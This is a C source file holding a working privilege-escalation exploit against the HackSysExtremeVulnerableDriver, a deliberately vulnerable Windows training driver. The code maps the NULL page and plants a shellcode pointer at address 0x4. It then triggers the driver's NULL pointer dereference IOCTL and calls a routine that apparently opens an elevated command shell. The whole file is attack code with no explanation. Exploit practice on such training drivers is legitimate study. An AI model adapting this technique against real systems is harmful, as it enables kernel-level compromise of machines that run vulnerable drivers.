#include<stdio.h>
#include<Windows.h>

#include "x86-header.h"

#define IOCTL(Function) CTL_CODE(FILE_DEVICE_UNKNOWN, Function, METHOD_NEITHER, FILE_ANY_ACCESS)
#define HEVD_IOCTL_NULL_POINTER_DEREFERENCE                      IOCTL(0x80A)

int main()
{
	int NTStatus = 0;
	WORD recvbuf;

	puts("[+] Start...");
	HANDLE hDevice = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", GENERIC_READ | GENERIC_WRITE, NULL, NULL, OPEN_EXISTING, NULL, NULL);
	if (hDevice == INVALID_HANDLE_VALUE || hDevice == NULL)
	{
		puts("Failed to Open Device");
		return 0;
	}

	puts("[+] Prepare work");
	HMODULE hModule = LoadLibraryA("ntdll.dll");
	if (hModule == 0)
	{
		puts("Failed to load ntdll.dll");
		return 0;
	}
	NtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)GetProcAddress(hModule, "NtAllocateVirtualMemory");
	if (NtAllocateVirtualMemory == 0)
	{
		puts("Failed to resolve NtAllocateVirtualMemory");
		return 0;
	}

	PVOID ZeroAddr = 1;
	ULONG size = 0x1000;
	NTStatus = NtAllocateVirtualMemory(INVALID_HANDLE_VALUE, &ZeroAddr, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (NTStatus != 0 || ZeroAddr != 0)
	{
		puts("Failed to Allocate to 0 addr");
		printf("Alloc: 0x%p\n", ZeroAddr);
		return 0;
	}

	printf("Alloc: 0x%p\n", ZeroAddr);

	*(DWORD*)(0x4) = (DWORD)&ShellCode;

	ULONG buf = 1;

	puts("[+] Trigger");
	DeviceIoControl(hDevice, HEVD_IOCTL_NULL_POINTER_DEREFERENCE, &buf, 4, NULL, 0, &recvbuf, NULL);

	CreateCmd();

	return 0;
}